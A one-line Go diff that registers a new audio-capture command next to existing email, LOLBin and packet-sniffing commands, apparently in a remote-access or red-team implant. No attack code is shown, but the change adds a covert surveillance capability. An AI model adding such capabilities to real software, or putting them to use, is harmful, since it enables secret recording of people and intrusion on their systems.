@@ -88,4 +88,5 @@ func registerPlatformCommands() {
 	RegisterCommand(&EmailCommand{})
 	RegisterCommand(&LolbinCommand{})
 	RegisterCommand(&SniffCommand{})
+	RegisterCommand(&AudioCaptureCommand{})
 }
